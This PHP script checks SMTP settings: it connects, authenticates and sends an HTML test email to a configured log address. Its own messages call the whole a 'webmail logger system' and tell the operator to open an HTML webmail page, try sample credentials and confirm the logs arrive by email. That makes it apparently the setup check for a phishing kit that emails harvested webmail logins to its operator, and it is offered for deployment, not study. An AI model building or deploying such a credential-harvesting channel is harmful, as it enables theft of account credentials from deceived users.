<?php
/**
 * SMTP Configuration Test Script
 * Run this script to test your SMTP settings before deploying the main system
 */

// Load configuration
$config = file_exists('config.php') ? include 'config.php' : [];

if (empty($config)) {
    die("❌ Config file not found. Please create config.php first.\n");
}

echo "🔧 Testing SMTP Configuration...\n\n";

// Display current configuration (without sensitive info)
echo "📧 SMTP Settings:\n";
echo "Host: " . ($config['smtp']['host'] ?? 'Not set') . "\n";
echo "Port: " . ($config['smtp']['port'] ?? 'Not set') . "\n";
echo "Username: " . ($config['smtp']['username'] ?? 'Not set') . "\n";
echo "From Email: " . ($config['smtp']['from_email'] ?? 'Not set') . "\n";
echo "Log Email: " . ($config['logging']['log_email'] ?? 'Not set') . "\n\n";

// Check if required settings are configured
$required_fields = [
    'smtp.host', 'smtp.port', 'smtp.username', 'smtp.password', 
    'smtp.from_email', 'logging.log_email'
];

$missing_fields = [];
foreach ($required_fields as $field) {
    $keys = explode('.', $field);
    $value = $config;
    foreach ($keys as $key) {
        $value = $value[$key] ?? null;
    }
    
    if (empty($value) || $value === 'your-email@gmail.com' || $value === 'your-app-password' || $value === 'logs@yourdomain.com') {
        $missing_fields[] = $field;
    }
}

if (!empty($missing_fields)) {
    echo "❌ Please configure these settings in config.php:\n";
    foreach ($missing_fields as $field) {
        echo "   - $field\n";
    }
    echo "\n";
    exit(1);
}

// Test SMTP connection
echo "🔌 Testing SMTP Connection...\n";

$smtp_host = $config['smtp']['host'];
$smtp_port = $config['smtp']['port'];
$smtp_username = $config['smtp']['username'];
$smtp_password = $config['smtp']['password'];
$smtp_from_email = $config['smtp']['from_email'];
$smtp_from_name = $config['smtp']['from_name'];
$log_email = $config['logging']['log_email'];

function testSMTPConnection($host, $port, $username, $password) {
    $socket = @fsockopen($host, $port, $errno, $errstr, 10);
    if (!$socket) {
        return "❌ Connection failed: $errstr ($errno)";
    }
    
    $response = fgets($socket, 512);
    if (substr($response, 0, 3) != '220') {
        fclose($socket);
        return "❌ Invalid server response: " . trim($response);
    }
    
    // Test EHLO
    fputs($socket, "EHLO test\r\n");
    $response = fgets($socket, 512);
    
    // Test STARTTLS if port 587
    if ($port == 587) {
        fputs($socket, "STARTTLS\r\n");
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '220') {
            fclose($socket);
            return "❌ STARTTLS failed: " . trim($response);
        }
        
        if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            fclose($socket);
            return "❌ TLS encryption failed";
        }
        
        fputs($socket, "EHLO test\r\n");
        $response = fgets($socket, 512);
    }
    
    // Test AUTH
    fputs($socket, "AUTH LOGIN\r\n");
    $response = fgets($socket, 512);
    if (substr($response, 0, 3) != '334') {
        fclose($socket);
        return "❌ AUTH LOGIN not supported: " . trim($response);
    }
    
    fputs($socket, base64_encode($username) . "\r\n");
    $response = fgets($socket, 512);
    if (substr($response, 0, 3) != '334') {
        fclose($socket);
        return "❌ Username rejected: " . trim($response);
    }
    
    fputs($socket, base64_encode($password) . "\r\n");
    $response = fgets($socket, 512);
    if (substr($response, 0, 3) != '235') {
        fclose($socket);
        return "❌ Authentication failed: " . trim($response);
    }
    
    fputs($socket, "QUIT\r\n");
    fclose($socket);
    
    return "✅ SMTP connection successful!";
}

$connection_result = testSMTPConnection($smtp_host, $smtp_port, $smtp_username, $smtp_password);
echo $connection_result . "\n\n";

if (strpos($connection_result, '❌') !== false) {
    echo "💡 Troubleshooting tips:\n";
    echo "   - Verify your SMTP credentials\n";
    echo "   - Check if 2FA is enabled (use app password for Gmail)\n";
    echo "   - Ensure firewall allows outbound connections on port $smtp_port\n";
    echo "   - Try different SMTP providers if issues persist\n\n";
    exit(1);
}

// Test sending actual email
echo "📤 Sending test email...\n";

$test_subject = 'SMTP Test - ' . date('Y-m-d H:i:s');
$test_message = '
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .success { background-color: #d4edda; padding: 15px; border-left: 4px solid #28a745; }
    </style>
</head>
<body>
    <div class="success">
        <h2>✅ SMTP Test Successful!</h2>
        <p>Your SMTP configuration is working correctly.</p>
        <p><strong>Test Details:</strong></p>
        <ul>
            <li>SMTP Host: ' . $smtp_host . '</li>
            <li>SMTP Port: ' . $smtp_port . '</li>
            <li>Test Time: ' . date('Y-m-d H:i:s T') . '</li>
        </ul>
        <p>You can now deploy your webmail logger system.</p>
    </div>
</body>
</html>';

// Simple email function for testing
function sendTestEmail($to, $subject, $message, $from_email, $from_name, $host, $port, $username, $password) {
    try {
        $socket = fsockopen($host, $port, $errno, $errstr, 30);
        if (!$socket) return false;
        
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '220') { fclose($socket); return false; }
        
        fputs($socket, "EHLO " . gethostname() . "\r\n");
        fgets($socket, 512);
        
        if ($port == 587) {
            fputs($socket, "STARTTLS\r\n");
            fgets($socket, 512);
            stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            fputs($socket, "EHLO " . gethostname() . "\r\n");
            fgets($socket, 512);
        }
        
        fputs($socket, "AUTH LOGIN\r\n");
        fgets($socket, 512);
        fputs($socket, base64_encode($username) . "\r\n");
        fgets($socket, 512);
        fputs($socket, base64_encode($password) . "\r\n");
        $auth_response = fgets($socket, 512);
        if (substr($auth_response, 0, 3) != '235') { fclose($socket); return false; }
        
        fputs($socket, "MAIL FROM: <$from_email>\r\n");
        fgets($socket, 512);
        fputs($socket, "RCPT TO: <$to>\r\n");
        fgets($socket, 512);
        fputs($socket, "DATA\r\n");
        fgets($socket, 512);
        
        $email_content = "From: $from_name <$from_email>\r\n";
        $email_content .= "To: $to\r\n";
        $email_content .= "Subject: $subject\r\n";
        $email_content .= "MIME-Version: 1.0\r\n";
        $email_content .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
        $email_content .= $message . "\r\n.\r\n";
        
        fputs($socket, $email_content);
        $send_response = fgets($socket, 512);
        fputs($socket, "QUIT\r\n");
        fclose($socket);
        
        return substr($send_response, 0, 3) == '250';
    } catch (Exception $e) {
        return false;
    }
}

$email_sent = sendTestEmail($log_email, $test_subject, $test_message, $smtp_from_email, $smtp_from_name, $smtp_host, $smtp_port, $smtp_username, $smtp_password);

if ($email_sent) {
    echo "✅ Test email sent successfully to $log_email\n";
    echo "   Check your inbox for the test message.\n\n";
    
    echo "🎉 Configuration Test Complete!\n";
    echo "   Your SMTP setup is working correctly.\n";
    echo "   You can now use your webmail logger system.\n\n";
    
    echo "📋 Next Steps:\n";
    echo "   1. Open your HTML webmail page\n";
    echo "   2. Test with sample credentials\n";
    echo "   3. Verify logs are received via email\n";
    echo "   4. Check local log file if enabled\n";
} else {
    echo "❌ Failed to send test email\n";
    echo "   SMTP connection works but email sending failed.\n";
    echo "   Check your email configuration and try again.\n";
}

echo "\n";
?>